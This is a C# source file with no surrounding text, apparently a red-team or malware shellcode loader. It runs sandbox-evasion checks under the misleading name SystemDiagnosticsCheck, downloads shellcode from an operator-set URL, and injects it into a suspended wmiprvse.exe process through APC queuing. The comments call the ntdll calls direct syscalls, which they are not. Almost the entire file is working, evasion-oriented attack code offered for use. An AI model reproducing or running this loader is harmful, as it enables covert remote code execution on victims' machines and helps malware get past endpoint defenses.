using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    private const int MEM_COMMIT = 0x1000;
    private const int MEM_RESERVE = 0x2000;
    private const int PAGE_EXECUTE_READWRITE = 0x40;
    private const int PAGE_EXECUTE_READ = 0x20;
    private const int CREATE_SUSPENDED = 0x4;
    private const int THREAD_HIDE_FROM_DEBUGGER = 0x11;

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    // Direct Syscall Stubs
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, ref UIntPtr RegionSize, uint AllocationType, uint Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferLength, out uint BytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UIntPtr RegionSize, uint NewProtect, out uint OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr SystemArgument1, IntPtr SystemArgument2, IntPtr SystemArgument3);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtResumeThread(IntPtr hThread, out uint SuspendCount);

    static void SystemDiagnosticsCheck()
    {
        Stopwatch sw = Stopwatch.StartNew();
        Thread.Sleep(2000);
        sw.Stop();

        if (sw.ElapsedMilliseconds < 1.5)
        {
            Environment.Exit(1);
        }

        ulong memSize = GetTotalMemoryInGB();
        if (memSize <= 1)
        {
            Environment.Exit(1);
        }
    }

    static ulong GetTotalMemoryInGB()
    {
        try
        {
            return new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / (1024 * 1024 * 1024);
        }
        catch
        {
            return 0;
        }
    }

    static byte[] GetPayloadFromUrl(string url)
    {
        using (WebClient wc = new WebClient())
        {
            return wc.DownloadData(url);
        }
    }

    static PROCESS_INFORMATION StartSuspendedProcess(string processPath)
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        si.cb = Marshal.SizeOf(si);

        bool success = CreateProcessA(processPath, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
        if (!success)
        {
            throw new Exception("Failed to create suspended process.");
        }

        return pi;
    }

    static IntPtr GetSyscallStub(string syscallName)
    {
        IntPtr hModule = LoadLibrary("ntdll.dll");
        IntPtr syscallAddress = GetProcAddress(hModule, syscallName);
        if (syscallAddress == IntPtr.Zero)
        {
            Console.WriteLine($"[ERROR] Failed to resolve {syscallName}");
            Environment.Exit(1);
        }
        return syscallAddress;
    }

    static void Main()
    {
        SystemDiagnosticsCheck();

        string url = "http://192.168.x.x/sc.bin"; // change to you IP
        byte[] payload = GetPayloadFromUrl(url);

        if (payload.Length == 0)
        {
            Console.WriteLine("Error: Unable to retrieve the specified URI.");
            return;
        }

        PROCESS_INFORMATION pi = StartSuspendedProcess("C:\\Windows\\System32\\wbem\\wmiprvse.exe");
        IntPtr hProcess = pi.hProcess;
        IntPtr hThread = pi.hThread;

        // Resolve syscalls dynamically via stub resolution
        NtAllocateVirtualMemory syscallAlloc = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetSyscallStub("NtAllocateVirtualMemory"), typeof(NtAllocateVirtualMemory));
        NtWriteVirtualMemory syscallWrite = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetSyscallStub("NtWriteVirtualMemory"), typeof(NtWriteVirtualMemory));
        NtProtectVirtualMemory syscallProtect = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetSyscallStub("NtProtectVirtualMemory"), typeof(NtProtectVirtualMemory));
        NtQueueApcThread syscallQueue = (NtQueueApcThread)Marshal.GetDelegateForFunctionPointer(GetSyscallStub("NtQueueApcThread"), typeof(NtQueueApcThread));
        NtResumeThread syscallResume = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(GetSyscallStub("NtResumeThread"), typeof(NtResumeThread));

        // Allocate memory using direct syscall stubs
        IntPtr shellcodeAddress = IntPtr.Zero;
        UIntPtr regionSize = (UIntPtr)payload.Length;
        if (syscallAlloc(hProcess, ref shellcodeAddress, UIntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) != 0)
        {
            Console.WriteLine("[ERROR] Memory allocation failed.");
            return;
        }

        // Write shellcode using direct syscall stubs
        if (syscallWrite(hProcess, shellcodeAddress, payload, (uint)payload.Length, out uint bytesWritten) != 0)
        {
            Console.WriteLine("[ERROR] Failed to write shellcode.");
            return;
        }

        // Change memory protection using direct syscall stubs
        if (syscallProtect(hProcess, ref shellcodeAddress, ref regionSize, PAGE_EXECUTE_READ, out uint oldProtect) != 0)
        {
            Console.WriteLine("[ERROR] Failed to change memory protection.");
            return;
        }

        // Queue APC using direct syscall stubs
        if (syscallQueue(hThread, shellcodeAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) != 0)
        {
            Console.WriteLine("[ERROR] Failed to queue APC.");
            return;
        }

        // Resume thread using direct syscall stubs
        syscallResume(hThread, out _);

        // Cleanup handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
